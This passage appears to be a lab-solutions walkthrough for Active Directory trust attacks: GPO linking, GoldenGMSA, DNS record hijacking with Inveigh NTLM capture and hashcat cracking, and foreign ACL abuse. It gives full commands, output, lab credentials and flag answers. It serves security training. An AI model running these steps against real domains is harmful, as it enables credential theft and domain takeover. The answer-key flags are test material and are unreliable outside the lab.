PS C:\Tools> Get-ADDomainController -Server inlanefreight.ad | select ServerObjectDN

ServerObjectDN
--------------
CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
```

They will have to spawn a `PowerShell` terminal as `SYSTEM` using `PsExec.exe` , and then within the newly spawned terminal students need to create a variable that will hold the value from the `ServerObjectDN` attribute which will be used to create the group policy link:

Code: powershell

```powershell
.\PsExec.exe -accepteula -s -i powershell
$sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD"
New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.inlanefreight.ad
```

```
PS C:\Tools> .\PsExec.exe -accepteula -s -i powershell

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com

PS C:\Windows\system32> $sitePath = "CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD"
PS C:\Windows\system32> New-GPLink -Name "Backdoor" -Target $sitePath -Server dev.inlanefreight.ad

GpoId       : 52b5ecd7-19d7-4c48-8463-8b8224a6bc5d
DisplayName : Backdoor
Enabled     : True
Enforced    : False
Target      : CN=Default-First-Site-Name,cn=Sites,CN=Configuration,DC=INLANEFREIGHT,DC=AD
Order       : 1
```

Subsequently, students need to navigate to `C:\Tools`, and use `Rubeus.exe` to request a ticket-grating ticket (TGT) by supplying the username and the new password, which the ticket then will be imported into memory:

Code: powershell

```powershell
cd C:\Tools
.\Rubeus.exe asktgt /user:gpo_admin /password:'Ac@demy123' /domain:inlanefreight.ad /ptt
```

```
PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> .\Rubeus.exe asktgt /user:gpo_admin /password:'Ac@demy123' /domain:inlanefreight.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 863EAD83343E2C19BC4F68C0380DDD41
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.ad\gpo_admin'
[*] Using domain controller: 172.16.210.99:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFxDCCBcCgAwIBBaEDAgEWooIEzDCCBMhhggTEMIIEwKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi

<SNIP>
      
      RKklMCOgAwIBAqEcMBobBmtyYnRndBsQaW5sYW5lZnJlaWdodC5hZA==
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.ad
  ServiceRealm             :  INLANEFREIGHT.AD
  UserName                 :  gpo_admin
  UserRealm                :  INLANEFREIGHT.AD
  StartTime                :  4/25/2024 5:34:36 AM
  EndTime                  :  4/25/2024 3:34:36 PM
  RenewTill                :  5/2/2024 5:34:36 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  B/WvJx5LuLeDhTpl2IaQIw==
  ASREP (key)              :  863EAD83343E2C19BC4F68C0380DDD41
```

Right after the ticket has been imported, students can proceed to grab the flag.

Code: powershell

```powershell
type \\DC01\GPO_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\GPO_flag\flag.txt
6488d86a495073926f75e8d9be91e6bf
```

Answer: `6488d86a495073926f75e8d9be91e6bf`

# GoldenGMSA Attack

## Question 1

### "What is the SID (objectSid) value of the "gmsa\_adm$" account?"

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-1akrtch4ne]─[~]
└──╼ [★]$ xfreerdp /v:10.129.237.96 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.237.96:3389) 
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.237.96:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students need to open `PowerShell`, navigate to `C:\Tools`, and use `GoldenGMSA.exe`:

Code: powershell

```powershell
cd C:\Tools
.\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\GoldenGMSA.exe gmsainfo --domain inlanefreight.ad

<SNIP>

sAMAccountName:         gmsa_adm$
objectSid:              S-1-5-21-2879935145-656083549-3766571964-3103
rootKeyGuid:            ba932c0c-5c34-ce6e-fcb8-d441d116a736

<SNIP>
```

Answer: `S-1-5-21-2879935145-656083549-3766571964-3103`

# GoldenGMSA Attack

## Question 2

### "Compromise the "gmsa\_adm$" account and submit the flag at "\\\\DC01\\GMSA\_flag\\flag.txt""

Using the previously established RDP session, students need to elevate to `SYSTEM` using `PsExec.exe` located in the `C:\Tools` directory:

Code: powershell

```powershell
.\PsExec.exe -accepteula -s -i powershell
```

```
PS C:\Tools> .\PsExec.exe -accepteula -s -i powershell
```

Subsequently, students need to navigate back to `C:\Tools` where they will perform the Online Attack outlined in the section using `GoldenGMSA.exe` with the `compute` parameter using the previously found SID of the `gmsa_adm$` user:

Code: powershell

```powershell
cd C:\Tools
.\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-3103" --forest dev.inlanefreight.ad --domain inlanefreight.ad
```

```
PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> .\GoldenGMSA.exe compute --sid "S-1-5-21-2879935145-656083549-3766571964-3103" --forest dev.inlanefreight.ad --domain inlanefreight.ad

Base64 Encoded Password:        fxALhTvw1owXFC1JK8i8GDV3tXLtJHGxjD4lbYrpMUL8jVBy0a1RqvaJ+xacjCHQITPhxKg0YFgUBcj9h+LneFQegcfOXpNS6s6aTgMarGRnzwdXFm1ESYOwlDNiOP17JHze9kTmgk9x3RWSWdBy0HvDWdfSOM1nf/bNlakFDbpfOjtAEtcBpG1tb60yerbxJlhJEqNhOl+aj+z7U3CDl/hLN4tUMElylPEKvIXFb885T6RjywCd9jep1g77cAFckzae3VhfHWHAKq1duNSXQ00qPb7iFiznWFQVKBfzyb8Pp2y2C3/JwkaHq/0HLpvVmRuIC3K5WlAMTqLvkqG2sA==
```

Right after, they have obtained the base64 encoded password, students will have to utilize the `convert-to-nt.py` python script and replace the value in the `base64_input` variable with the base64 one to get the password into `rc4` format on their Linux hosts:

Code: python

```python
import base64
import hashlib

base64_input = "fxALhTvw1owXFC1JK8i8GDV3tXLtJHGxjD4lbYrpMUL8jVBy0a1RqvaJ+xacjCHQITPhxKg0YFgUBcj9h+LneFQegcfOXpNS6s6aTgMarGRnzwdXFm1ESYOwlDNiOP17JHze9kTmgk9x3RWSWdBy0HvDWdfSOM1nf/bNlakFDbpfOjtAEtcBpG1tb60yerbxJlhJEqNhOl+aj+z7U3CDl/hLN4tUMElylPEKvIXFb885T6RjywCd9jep1g77cAFckzae3VhfHWHAKq1duNSXQ00qPb7iFiznWFQVKBfzyb8Pp2y2C3/JwkaHq/0HLpvVmRuIC3K5WlAMTqLvkqG2sA=="

print(hashlib.new("md4", base64.b64decode(base64_input)).hexdigest())
```

Running the Python script will print out the rc4 format of the password:

Code: shell

```shell
python3 convert-to-nt.py
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-efk5dgfdqe]─[~]
└──╼ [★]$ python3 convert-to-nt.py 

b05b4f5fb4f7243102ef860bbd658df7
```

Subsequently, students need to return to the RDP session and utilize `Rubeus.exe` to request a ticket-granting ticket (TGT) for the user which will be imported into memory:

Code: powershell

```powershell
.\Rubeus.exe asktgt /user:'gmsa_adm$' /rc4:b05b4f5fb4f7243102ef860bbd658df7 /domain:inlanefreight.ad /ptt
```

```
PS C:\Tools> .\Rubeus.exe asktgt /user:'gmsa_adm$' /rc4:b05b4f5fb4f7243102ef860bbd658df7 /domain:inlanefreight.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: f6d16f12e5b18e38c852a9203077be38
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.ad\gmsa_adm$'
[*] Using domain controller: 172.16.210.99:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFtDCCBbCgAwIBBaEDAgEWooIEvDCCBLhhggS0MIIEsKADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi

<SNIP>
      MTMyNDZapxEYDzIwMjQwNTAyMTEzMjQ2WqgSGxBJTkxBTkVGUkVJR0hULkFEqSUwI6ADAgECoRwwGhsG
      a3JidGd0GxBpbmxhbmVmcmVpZ2h0LmFk
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.ad
  ServiceRealm             :  INLANEFREIGHT.AD
  UserName                 :  gmsa_adm$
  UserRealm                :  INLANEFREIGHT.AD
  StartTime                :  2/5/2025 5:13:11 AM
  EndTime                  :  2/5/2025 3:13:11 PM
  RenewTill                :  2/12/2025 5:13:11 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  26cEYM4Nnt35XfdOlRdu6w==
  ASREP (key)              :  B05B4F5FB4F7243102EF860BBD658DF7
```

Right after, the ticket gets imported, students can proceed to grab the flag:

Code: powershell

```powershell
type \\DC01\GMSA_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\GMSA_flag\flag.txt

95f6b2904700e00742c6349f5c0f95f9
```

Answer: `95f6b2904700e00742c6349f5c0f95f9`

# DNS Trust Attack

## Question 1

### "Follow the "Arbitrary DNS Record Modification" example shown above. What is the password for the domain user buster?"

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-1akrtch4ne]─[~]
└──╼ [★]$ xfreerdp /v:10.129.237.96 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.237.96:3389) 
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.237.96:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students need to open `PowerShell`, navigate to `C:\Tools`, and use `PsExec.exe` to establish a session as `SYSTEM`:

Code: powershell

```powershell
cd C:\Tools
.\PsExec.exe -accepteula -s -i powershell
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\PsExec.exe -accepteula -s -i powershell

PsExec v2.43 - Execute processes remotely
Copyright (C) 2001-2023 Mark Russinovich
Sysinternals - www.sysinternals.com
```

Using the newly spawned `PowerShell` terminal, students need to enumerate the DNS record for the `DEV01` workstation:

Code: powershell

```powershell
Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.inlanefreight.ad
```

```
PS C:\Windows\system32> Resolve-DnsName -Name DEV01.inlanefreight.ad -Server DC01.inlanefreight.ad

Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
DEV01.inlanefreight.ad                         A      3600  Answer     172.16.210.7
```

Subsequently, they will proceed to alter the DNS record for `DEV01` with the IP of `DC02`:

Code: powershell

```powershell
$Old = Get-DnsServerResourceRecord -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad -Name DEV01
$New = $Old.Clone()
$TTL = [System.TimeSpan]::FromSeconds(1)
$New.TimeToLive = $TTL
$New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad
Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"
```

```
PS C:\Windows\system32> $Old = Get-DnsServerResourceRecord -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad -Name DEV01
PS C:\Windows\system32> $New = $Old.Clone()
PS C:\Windows\system32> $TTL = [System.TimeSpan]::FromSeconds(1)
PS C:\Windows\system32> $New.TimeToLive = $TTL
PS C:\Windows\system32> $New.RecordData.IPv4Address = [System.Net.IPAddress]::parse('172.16.210.3')
PS C:\Windows\system32> Set-DnsServerResourceRecord -NewInputObject $New -OldInputObject $Old -ComputerName DC01.INLANEFREIGHT.AD -ZoneName inlanefreight.ad
PS C:\Windows\system32> Get-DnsServerResourceRecord -ComputerName DC01.inlanefreight.ad -ZoneName inlanefreight.ad -Name "@"

HostName                  RecordType Type       Timestamp            TimeToLive      RecordData
--------                  ---------- ----       ---------            ----------      ----------
@                         A          1          4/25/2024 7:00:00 AM 00:10:00        172.16.210.99
@                         NS         2          0                    01:00:00        dc01.inlanefreight.ad.
@                         SOA        6          0                    01:00:00        [128][dc01.inlanefreight.ad.][h...
dc01                      A          1          0                    00:20:00        172.16.210.99
DEV01                     A          1          0                    00:00:01        172.16.210.3
```

Right after the changes, students will proceed to navigate to the `C:\Tools` directory and import the `Inveigh.ps1` module, which will be used to capture the traffic and capture the NTLM authentications happening in the network:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y
```

Code: session

```
PS C:\Windows\system32> cd C:\Tools
PS C:\Tools> Import-Module .\Inveigh.ps1
PS C:\Tools> Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y -SMB Y

[*] Inveigh 1.506 started at 2024-04-25T07:36:57
[+] Elevated Privilege Mode = Enabled
[+] Primary IP Address = 172.16.210.3
[+] Spoofer IP Address = 172.16.210.3
[+] ADIDNS Spoofer = Disabled
[+] DNS Spoofer = Enabled
[+] DNS TTL = 30 Seconds
[+] LLMNR Spoofer = Enabled
[+] LLMNR TTL = 30 Seconds
[+] mDNS Spoofer = Disabled
[+] NBNS Spoofer = Disabled
[+] SMB Capture = Enabled
[+] HTTP Capture = Enabled
[+] HTTPS Capture = Disabled
[+] HTTP/HTTPS Authentication = NTLM
```

After a few moments, students will notice the captured NTLM authentication for the user `buster`, once captured students can terminate `Inveigh` using the key combination of `CTRL + C` and `Stop-Inveigh` cmdlet:

Code: powershell

```powershell
Stop-Inveigh
```

```
<SNIP>
[+] [2024-04-25T07:37:49] SMB(445) NTLM challenge 16538F8B75791BC8 sent to 172.16.210.99:65372
[+] [2024-04-25T07:37:49] SMB(445) NTLMv2 captured for INLANEFREIGHT\buster from 172.16.210.99(DC01):65372:
buster::INLANEFREIGHT:16538F8B75791BC8:5BCAC67DEF7AFF96BE41D31C10372B3A:010100000000000033DBD5610D97DA018F0B7D45596C6B140000000002000600440045005600010008004400430030003200040028006400650076002E0049004E004C0041004E00450046005200450049004700480054002E00410044000300320044004300300032002E006400650076002E0049004E004C0041004E00450046005200450049004700480054002E00410044000500200049004E004C0041004E00450046005200450049004700480054002E00410044000700080033DBD5610D97DA01060004000200000008003000300000000000000000000000002100007D350B10A0AE7A88835C0C7DB955E62E7D946701F938927527EB10D0579FF9520A001000000000000000000000000000000000000900360063006900660073002F00440045005600300031002E0049004E004C0041004E00450046005200450049004700480054002E00410044000000000000000000
<SNIP>

PS C:\Tools> Stop-Inveigh
[*] [2024-04-25T07:40:01] Inveigh is exiting
```

Subsequently, students need to utilize the Linux workstation to save the hash into a file which will be cracked using `hashcat` and the `rockyou.txt` dictionary file.

Code: shell

```shell
echo -n "buster::INLANEFREIGHT:16538F8B75791BC8:5BCAC67DEF7AFF96BE41D31C10372B3A:010100000000000033DBD5610D97DA018F0B7D45596C6B140000000002000600440045005600010008004400430030003200040028006400650076002E0049004E004C0041004E00450046005200450049004700480054002E00410044000300320044004300300032002E006400650076002E0049004E004C0041004E00450046005200450049004700480054002E00410044000500200049004E004C0041004E00450046005200450049004700480054002E00410044000700080033DBD5610D97DA01060004000200000008003000300000000000000000000000002100007D350B10A0AE7A88835C0C7DB955E62E7D946701F938927527EB10D0579FF9520A001000000000000000000000000000000000000900360063006900660073002F00440045005600300031002E0049004E004C0041004E00450046005200450049004700480054002E00410044000000000000000000" > buster_ntlmv2

hashcat -m 5600 buster_ntlmv2 /usr/share/wordlist/rockyou.txt
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-ybhoy8bdc3]─[~]
└──╼ [★]$ echo -n "buster::INLANEFREIGHT:16538F8B75791BC8:5BCAC67DEF7AFF96BE41D31C10372B3A:010100000000000033DBD5610D97DA018F0B7D45596C6B140000000002000600440045005600010008004400430030003200040028006400650076002E0049004E004C0041004E00450046005200450049004700480054002E00410044000300320044004300300032002E006400650076002E0049004E004C0041004E00450046005200450049004700480054002E00410044000500200049004E004C0041004E00450046005200450049004700480054002E00410044000700080033DBD5610D97DA01060004000200000008003000300000000000000000000000002100007D350B10A0AE7A88835C0C7DB955E62E7D946701F938927527EB10D0579FF9520A001000000000000000000000000000000000000900360063006900660073002F00440045005600300031002E0049004E004C0041004E00450046005200450049004700480054002E00410044000000000000000000" > buster_ntlmv2

┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-ybhoy8bdc3]─[~]
└──╼ [★]$ hashcat -m 5600 buster_ntlmv2 /usr/share/wordlists/rockyou.txt 
hashcat (v6.1.1) starting...

<SNIP>

BUSTER::INLANEFREIGHT:16538f8b75791bc8:5bcac67def7aff96be41d31c10372b3a:010100000000000033dbd5610d97da018f0b7d45596c6b140000000002000600440045005600010008004400430030003200040028006400650076002e0049004e004c0041004e00450046005200450049004700480054002e00410044000300320044004300300032002e006400650076002e0049004e004c0041004e00450046005200450049004700480054002e00410044000500200049004e004c0041004e00450046005200450049004700480054002e00410044000700080033dbd5610d97da01060004000200000008003000300000000000000000000000002100007d350b10a0ae7a88835c0c7db955e62e7d946701f938927527eb10d0579ff9520a001000000000000000000000000000000000000900360063006900660073002f00440045005600300031002e0049004e004c0041004e00450046005200450049004700480054002e00410044000000000000000000:hunter
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: NetNTLMv2
Hash.Target......: BUSTER::INLANEFREIGHT:16538f8b75791bc8:5bcac67def7a...000000
Time.Started.....: Thu Apr 25 13:41:25 2024 (0 secs)
<SNIP>
```

Answer: `hunter`

# DNS Trust Attack

## Question 2

### "Follow the example shown above and authenticate as user "buster". Submit the flag located at "\\\\DC01\\DNS\_flag\\flag.txt". (The flag is accessible by the "inlanefreight\\buster" user)"

Using the previously established RDP session, students will have to navigate to `C:\Tools` and use `Rubeus.exe` to request a ticket-granting ticket (TGT) that is going to be imported into memory using the password from the previous question:

Code: powershell

```powershell
cd C:\Tools
.\Rubeus.exe asktgt /user:buster /password:hunter /domain:inlanefreight.ad /ptt
```

```
PS C:\Tools> cd C:\Tools
PS C:\Tools> .\Rubeus.exe asktgt /user:buster /password:hunter /domain:inlanefreight.ad /ptt

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/
  
  v2.2.3

[*] Action: Ask TGT

[*] Using rc4_hmac hash: 2BDCAD6D2082323222A291328AB4883E
[*] Building AS-REQ (w/ preauth) for: 'inlanefreight.ad\buster'
[*] Using domain controller: 172.16.210.99:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFljCCBZKgAwIBBaEDAgEWooIEoTCCBJ1hggSZMIIElaADAgEFoRIbEElOTEFORUZSRUlHSFQuQUSi

<SNIP>

GA8yMDI0MDQyNTEyNDYxNFqmERgPMjAyNDA0MjUyMjQ2MTRapxEYDzIwMjQwNTAyMTI0NjE0WqgSGxBJ
      TkxBTkVGUkVJR0hULkFEqSUwI6ADAgECoRwwGhsGa3JidGd0GxBpbmxhbmVmcmVpZ2h0LmFk
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.ad
  ServiceRealm             :  INLANEFREIGHT.AD
  UserName                 :  buster
  UserRealm                :  INLANEFREIGHT.AD
  StartTime                :  4/25/2024 7:46:14 AM
  EndTime                  :  4/25/2024 5:46:14 PM
  RenewTill                :  5/2/2024 7:46:14 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  5cLj7SV6V96oe+KI/RldCg==
  ASREP (key)              :  2BDCAD6D2082323222A291328AB4883E
```

With the imported ticket in memory, students can proceed to grab the flag:

Code: powershell

```powershell
type \\DC01\DNS_flag\flag.txt
```

```
PS C:\Tools> type \\DC01\DNS_flag\flag.txt

191f30406af530c8a5ba9636c7eaf106
```

Answer: `191f30406af530c8a5ba9636c7eaf106`

# Abusing Foreign Groups & ACL Principals

## Question 1

### "Submit another user from the child domain that has "GenericAll" rights over the "Server Admins" group in parent domain (Format: DEV\\username)"

After spawning the target machine students need to establish an RDP session using the credentials `Administrator:HTB_@cademy_adm!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 
```

```
┌─[us-academy-3]─[10.10.14.174]─[htb-ac-8414@htb-1akrtch4ne]─[~]
└──╼ [★]$ xfreerdp /v:10.129.237.96 /u:Administrator /p:'HTB_@cademy_adm!' /dynamic-resolution 

[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[11:06:05:756] [4200:4201] [WARN][com.freerdp.crypto] - CN = DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.237.96:3389) 
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - Common Name (CN):
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - 	DC02.dev.INLANEFREIGHT.AD
[11:06:05:756] [4200:4201] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.237.96:3389 (RDP-Server):
	Common Name: DC02.dev.INLANEFREIGHT.AD
	Subject:     CN = DC02.dev.INLANEFREIGHT.AD
	Issuer:      CN = DC02.dev.INLANEFREIGHT.AD
	Thumbprint:  61:6c:d0:4b:2a:33:ad:bd:4d:b9:b3:23:ee:f8:53:14:79:74:2a:72:cd:3f:8f:9f:fe:6c:59:d4:d6:c6:48:10
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
```

Students will have to open `PowerShell`, navigate to `C:\Tools`, and import `PowerView.ps1`:

Code: powershell

```powershell
cd C:\Tools
Import-Module .\PowerView.ps1
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> Import-Module .\PowerView.ps1
```

Subsequently, they will have to utilize the PowerShell code block from the section to enumerate the foreign ACLs for all users:

Code: powershell

```powershell
$Domain = "inlanefreight.ad"
$DomainSid = Get-DomainSid $Domain
Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | ? { 
	($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and \`
	($_.AceType -match 'AccessAllowed') -and \`
	($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and \`
	($_.SecurityIdentifier -notmatch $DomainSid)
} 
```

```
PS C:\Tools> $Domain = "inlanefreight.ad"
PS C:\Tools> $DomainSid = Get-DomainSid $Domain
PS C:\Tools> Get-DomainObjectAcl -Domain $Domain -ResolveGUIDs -Identity * | ? {
>> ($_.ActiveDirectoryRights -match 'WriteProperty|GenericAll|GenericWrite|WriteDacl|WriteOwner') -and \`
>> ($_.AceType -match 'AccessAllowed') -and \`
>> ($_.SecurityIdentifier -match '^S-1-5-.*-[1-9]\d{3,}$') -and \`
>> ($_.SecurityIdentifier -notmatch $DomainSid)
>> }

<SNIP>
AceType               : AccessAllowed
ObjectDN              : CN=Server Admins,CN=Users,DC=INLANEFREIGHT,DC=AD
ActiveDirectoryRights : GenericAll
OpaqueLength          : 0
ObjectSID             : S-1-5-21-2879935145-656083549-3766571964-2111
InheritanceFlags      : None
BinaryLength          : 36
IsInherited           : False
IsCallback            : False
PropagationFlags      : None
SecurityIdentifier    : S-1-5-21-2901893446-2198612369-2488268719-1106
AccessMask            : 983551
AuditFlags            : None
AceFlags              : None
AceQualifier          : AccessAllowed
```

Students will have to utilize `ConvertFrom-SID` cmdlet to get the ASCII representation of the username for the SID `S-1-5-21-2901893446-2198612369-2488268719-1106`:

Code: powershell

```powershell
ConvertFrom-SID S-1-5-21-2901893446-2198612369-2488268719-1106
```

```
PS C:\Tools> ConvertFrom-SID S-1-5-21-2901893446-2198612369-2488268719-1106

DEV\htb-student
```

Answer: `DEV\htb-student`

# Abusing Foreign Groups & ACL Principals

## Question 2

### "Abuse ACLs to add the user "Rita" into the "Infrastructure" group. Submit the flag located at "\\\\DC01\\Infrastructure\_flag\\flag.txt" (The flag is accessible by the "inlanefreight\\Infrastructure" group)"

With the previously established RDP session, students need to open `PowerShell`, navigate to `C:\Tools`, and use `Rubeus.exe` to spawn a `PowerShell` session:

Code: powershell

```powershell
cd C:\Tools
.\Rubeus.exe createnetonly /program:powershell /show
```

```
PS C:\Users\Administrator> cd C:\Tools
PS C:\Tools> .\Rubeus.exe createnetonly /program:powershell /show

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
